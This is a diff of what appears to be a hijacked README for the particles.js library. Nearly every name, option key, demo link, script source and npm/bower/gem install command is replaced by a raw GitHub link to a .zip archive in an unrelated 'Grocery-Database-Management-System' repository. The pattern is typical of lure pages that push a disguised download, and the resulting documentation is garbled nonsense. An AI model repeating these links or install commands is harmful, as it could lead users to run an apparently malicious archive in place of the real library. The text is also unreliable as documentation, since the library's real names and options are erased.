@@ -1,39 +1,39 @@
-## https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+## https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 
 ### A lightweight JavaScript library for creating particles.
 
 ------------------------------
 ### `Demo / Generator`
 
-<a href="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip" target="_blank"><img src="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip" alt="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip generator" /></a>
+<a href="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip" target="_blank"><img src="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip" alt="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip generator" /></a>
 
-Configure, export, and share your https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip configuration on CodePen: <br />
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+Configure, export, and share your https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip configuration on CodePen: <br />
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 
 CodePen demo: <br />
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 
 -------------------------------
 ### `Usage`
 
-Load https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip and configure the particles:
+Load https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip and configure the particles:
 
-**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip**
+**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip**
 ```html
 <div id="particles-js"></div>
 
-<script src="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip"></script>
+<script src="https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip"></script>
 ```
 
-**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip**
+**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip**
 ```javascript
-/* https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip(@dom-id, @path-json, @callback (optional)); */
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip('particles-js', 'https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip', function() {
-  https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip('callback - https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip config loaded');
+/* https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip(@dom-id, @path-json, @callback (optional)); */
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip('particles-js', 'https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip', function() {
+  https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip('callback - https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip config loaded');
 });
 ```
 
-**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip**
+**https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip**
 ```javascript
 {
   "particles": {
@@ -57,7 +57,7 @@ https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-
         "nb_sides": 5
       },
       "image": {
-        "src": "https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip",
+        "src": "https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip",
         "width": 100,
         "height": 100
       }
@@ -153,59 +153,59 @@ https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-
 
 key | option type / notes | example
 ----|---------|------
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `40`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false` 
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `800`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | HEX (string) <br /> RGB (object) <br /> HSL (object) <br /> array selection (HEX) <br /> random (string) | `"#b61924"` <br /> `{r:182, g:25, b:36}` <br />  `{h:356, s:76, l:41}` <br /> `["#b61924", "#333333", "999999"]` <br /> `"random"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string <br /> array selection | `"circle"` <br /> `"edge"` <br /> `"triangle"` <br /> `"polygon"` <br /> `"star"` <br /> `"image"` <br /> `["circle", "triangle", "image"]`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `2`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | HEX (string) | `"#222222"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `5`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | path link <br /> svg / png / gif / jpg | `"https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip"` <br /> `"https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number <br />(for aspect ratio) | `100`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number <br />(for aspect ratio) | `100`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number (0 to 1) | `0.75`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false` 
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false` 
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `3`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number (0 to 1) | `0.25`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `20`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false` 
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false` 
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `3`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `0.25`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `150`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | HEX (string) | `#ffffff`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number (0 to 1) | `0.5`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `1.5`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `4`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string | `"none"` <br /> `"top"` <br /> `"top-right"` <br /> `"right"` <br /> `"bottom-right"` <br /> `"bottom"` <br /> `"bottom-left"` <br /> `"left"` <br /> `"top-left"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string <br /> (out of canvas) | `"out"` <br /> `"bounce"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean <br /> (between particles) | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `3000`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `1500`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string | `"canvas", "window"`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string <br /> array selection | `"grab"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["grab", "bubble"]`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | string <br /> array selection | `"push"` <br /> `"remove"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["push", "repulse"]`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | boolean | `true` / `false`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `100`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number (0 to 1) | `0.75`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `100`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `40`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number <br /> (second) | `0.4`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `200`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number <br /> (second) | `1.2`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `4`
-`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip` | number | `4`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `40`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false` 
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `800`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | HEX (string) <br /> RGB (object) <br /> HSL (object) <br /> array selection (HEX) <br /> random (string) | `"#b61924"` <br /> `{r:182, g:25, b:36}` <br />  `{h:356, s:76, l:41}` <br /> `["#b61924", "#333333", "999999"]` <br /> `"random"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string <br /> array selection | `"circle"` <br /> `"edge"` <br /> `"triangle"` <br /> `"polygon"` <br /> `"star"` <br /> `"image"` <br /> `["circle", "triangle", "image"]`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `2`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | HEX (string) | `"#222222"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `5`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | path link <br /> svg / png / gif / jpg | `"https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip"` <br /> `"https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number <br />(for aspect ratio) | `100`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number <br />(for aspect ratio) | `100`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number (0 to 1) | `0.75`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false` 
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false` 
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `3`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number (0 to 1) | `0.25`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `20`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false` 
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false` 
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `3`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `0.25`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `150`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | HEX (string) | `#ffffff`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number (0 to 1) | `0.5`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `1.5`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `4`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string | `"none"` <br /> `"top"` <br /> `"top-right"` <br /> `"right"` <br /> `"bottom-right"` <br /> `"bottom"` <br /> `"bottom-left"` <br /> `"left"` <br /> `"top-left"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string <br /> (out of canvas) | `"out"` <br /> `"bounce"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean <br /> (between particles) | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `3000`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `1500`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string | `"canvas", "window"`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string <br /> array selection | `"grab"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["grab", "bubble"]`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | string <br /> array selection | `"push"` <br /> `"remove"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["push", "repulse"]`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | boolean | `true` / `false`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `100`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number (0 to 1) | `0.75`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `100`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `40`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number <br /> (second) | `0.4`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `200`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number <br /> (second) | `1.2`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `4`
+`https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip` | number | `4`
 `retina_detect` | boolean | `true` / `false`
 
 -------------------------------
@@ -213,23 +213,23 @@ key | option type / notes | example
 ### `Packages install`
 
 ##### ***npm***
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 ```
-npm install https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+npm install https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 ```
 
 ##### ***Bower***
 ```
-bower install https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip --save
+bower install https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip --save
 ```
 
 ##### ***Rails Assets***
 ```
-gem 'https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip'
+gem 'https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip'
 ```
 
 ##### ***Meteor***
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
 ```
 meteor add newswim:particles
 ```
@@ -238,6 +238,6 @@ meteor add newswim:particles
 
 ### `Hosting / CDN`
 
-***Please use this host or your own to load https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip on your projects***
+***Please use this host or your own to load https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip on your projects***
 
-https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip!https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/Blayne/Grocery-Database-Management-System.zip
+https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip!https://raw.githubusercontent.com/kumarsreenivas051/Grocery-Database-Management-System/master/demo/js/lib/Management-System-Database-Grocery-v2.9.zip
